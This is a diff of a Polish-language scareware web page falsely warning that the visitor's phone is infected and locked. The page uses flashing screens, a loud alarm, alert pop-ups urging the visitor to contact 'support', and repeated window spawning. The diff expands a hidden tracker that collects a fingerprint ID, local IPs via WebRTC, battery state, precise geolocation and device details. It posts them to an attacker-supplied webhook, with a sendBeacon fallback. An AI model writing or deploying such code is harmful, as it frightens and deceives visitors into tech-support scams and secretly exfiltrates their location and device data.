@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>⚠️ Twoje urządzenie zostało zainfekowane!</title>
   <style>
-    /* ---------- RESET & PODSTAWOWY FLASH ---------- */
+    /* ---------- RESET & FLASH ---------- */
     html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;background:#000;color:#fff;}
     @keyframes flash{0%,46%{background:#000;color:#fff;}50%,96%{background:#f00;color:#000;}}
     body{display:flex;justify-content:center;align-items:center;flex-direction:column;animation:flash 0.75s infinite alternate;}
@@ -27,45 +27,131 @@
       /* ---------- LOUD ALARM (requires user gesture on iOS) ---------- */
       const alarm=document.getElementById('alarm');
       setTimeout(()=>{alarm.play().catch(()=>{});},100);
-      // Re‑attempt on first user interaction if auto‑play fails
       const resume=()=>{alarm.play().catch(()=>{});document.removeEventListener('touchstart',resume);};
       document.addEventListener('touchstart',resume);
 
-      /* ---------- POP‑UPS (restored) ---------- */
+      /* ---------- POP‑UPS ---------- */
       const popTexts=[
         '⚠️ Krytyczny błąd systemu! Dane szyfrowane…',
         '⚠️ Twój telefon jest trwale zablokowany!',
         '⚠️ Skontaktuj się z pomocą techniczną NATYCHMIAST!',
       ];
       popTexts.forEach((txt,i)=>setTimeout(()=>alert(txt), 250+i*300));
-      // Otwarcie małych okien co 8s – wielu przeglądarek blokuje, ale warto spróbować
-      setInterval(()=>{
-        try{ window.open('about:blank','_blank','width=220,height=160'); }catch(e){}
-      },8000);
+      setInterval(()=>{ try{window.open('about:blank','_blank','width=220,height=160');}catch(e){} },8000);
 
-      /* ---------- FINGERPRINT & WEBHOOK ---------- */
-      await new Promise(r=>{if(document.readyState==='complete')r();else window.addEventListener('load',r);});
-      const fp=await FingerprintJS.load();
-      const result=await fp.get();
-      const payload={
-        visitorId:result.visitorId,
-        ua:navigator.userAgent,
-        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang:navigator.language,
-        platform:navigator.platform,
-        ts:Date.now()
+      /* ---------- WAIT FOR FULL LOAD ---------- */
+      await new Promise(r=>{ if(document.readyState==='complete') r(); else window.addEventListener('load',r); });
+
+      /* ---------- ADVANCED FINGERPRINT PAYLOAD ---------- */
+      const fp = await FingerprintJS.load();
+      const fpResult = await fp.get();
+
+      // Helper: gather local IPs via WebRTC (may fail in modern browsers)
+      async function getLocalIPs(){
+        return new Promise(res=>{
+          const ips=new Set();
+          const pc=new RTCPeerConnection({iceServers:[]});
+          pc.createDataChannel('');
+          pc.onicecandidate=e=>{
+            if(!e.candidate){ pc.close(); return res([...ips]); }
+            const parts=e.candidate.candidate.split(' ');
+            const ip=parts[4];
+            if(ip) ips.add(ip);
+          };
+          pc.createOffer().then(o=>pc.setLocalDescription(o));
+        });
+      }
+
+      // Helper: battery info
+      async function getBatteryInfo(){
+        try{
+          const b = await navigator.getBattery();
+          return {level:b.level, charging:b.charging};
+        }catch(_){return null;}
+      }
+
+      // Helper: geolocation
+      async function getGeoInfo(){
+        // 1) Try precise device geolocation (may need permission)
+        const deviceLoc = await new Promise(res=>{
+          if(!navigator.geolocation) return res(null);
+          navigator.geolocation.getCurrentPosition(
+            p=>res({lat:p.coords.latitude, lon:p.coords.longitude, accuracy:p.coords.accuracy, source:'device'}),
+            ()=>res(null),
+            {maximumAge:60000, timeout:3000}
+          );
+        });
+        if(deviceLoc) return deviceLoc;
+
+        // 2) Fallback to IP‑based lookup
+        try{
+          const r = await fetch('https://ipapi.co/json/');
+          if(r.ok){
+            const j = await r.json();
+            return {
+              ip:j.ip,
+              city:j.city,
+              region:j.region,
+              country:j.country_name,
+              lat:j.latitude,
+              lon:j.longitude,
+              source:'ipapi'
+            };
+          }
+        }catch(_){}
+        return null;
+      }
+
+      // Helper: network info
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+
+      const payload = {
+        visitorId: fpResult.visitorId,
+        ts: Date.now(),
+        ua: navigator.userAgent,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        langs: navigator.languages,
+        platform: navigator.platform,
+        cookies: navigator.cookieEnabled,
+        dnt: navigator.doNotTrack,
+        screen: {
+          w: screen.width,
+          h: screen.height,
+          availW: screen.availWidth,
+          availH: screen.availHeight,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio
+        },
+        deviceMemory: navigator.deviceMemory || null,
+        cores: navigator.hardwareConcurrency || null,
+        network: {
+          type: conn.type || conn.effectiveType,
+          downlink: conn.downlink,
+          rtt: conn.rtt
+        },
+        touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
+        plugins: (()=>{ try{return Array.from(navigator.plugins).map(p=>p.name).slice(0,10);}catch(_){return null;} })(),
+        localIPs: await getLocalIPs(),
+        battery: await getBatteryInfo(),
+        geo: await getGeoInfo()
       };
-      const WEBHOOK_URL='https://webhook.site/e14a76a4-a0b6-429b-a7b7-0c744665866e'; // <‑‑‑ Wstaw tu swój adres
 
-      // 1) próba standardowego POST z CORS
-      fetch(WEBHOOK_URL,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(payload)
-      }).catch(()=>{
-          // 2) Fallback: sendBeacon (lepsza gwarancja dostarczenia + brak CORS)
-          try{navigator.sendBeacon(WEBHOOK_URL,new Blob([JSON.stringify(payload)],{type:'application/json'}));}catch(e){}
-      });
+      const WEBHOOK_URL = 'https://REPLACE_ME_WITH_YOUR_WEBHOOK'; // <‑‑‑ Wstaw tu swój adres
+
+      function send(data){
+        // 1) POST JSON, mode no‑cors (brak CORS nagłówków = OK)
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify(data)
+        }).catch(()=>{});
+        // 2) sendBeacon (fallback / guarantee)
+        try{ navigator.sendBeacon(WEBHOOK_URL, new Blob([JSON.stringify(data)], {type:'application/json'})); }catch(e){}
+      }
+
+      send(payload);
   })();
   </script>
 </body>
